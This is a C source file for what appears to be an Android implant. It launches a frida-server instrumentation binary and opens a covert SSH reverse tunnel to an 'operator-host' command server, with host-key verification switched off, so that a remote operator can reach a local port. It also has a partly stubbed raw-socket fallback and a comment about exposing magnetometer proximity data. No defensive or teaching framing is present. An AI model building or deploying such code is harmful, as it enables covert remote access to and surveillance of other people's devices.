#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <fcntl.h>

#define FRIDA_PATH "/data/local/tmp/frida-server"
#define SSH_PATH "/system/bin/ssh"
#define LISTEN_PORT 7080
#define REMOTE_HOST "operator-host"
#define REMOTE_PORT 9090

static int file_exists(const char *p) { return access(p, X_OK) == 0; }

static void launch_frida(void) {
    if (fork() == 0) {
        execl(FRIDA_PATH, FRIDA_PATH, NULL);
        _exit(1);
    }
    sleep(2);
}

static void reverse_tunnel_ssh(void) {
    if (file_exists(SSH_PATH)) {
        execl(SSH_PATH, "ssh", "-i", "/data/local/tmp/c2a_key",
              "-o", "StrictHostKeyChecking=no",
              "-o", "UserKnownHostsFile=/dev/null",
              "-N", "-R", "7081:localhost:7080",
              "operator@operator-host", NULL);
    }
}

static void raw_tunnel_fallback(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REMOTE_PORT);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr); /* placeholder */
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) return;
    /* PSK handshake + proxy loop omitted for brevity; implement per spec */
    close(sock);
}

int main(void) {
    launch_frida();
    if (file_exists(SSH_PATH)) {
        reverse_tunnel_ssh();
    } else {
        raw_tunnel_fallback();
    }
    /* Adaptive policy loop: poll magnetometer, expose proximity on 7080 */
    while (1) {
        sleep(1);
    }
    return 0;
}
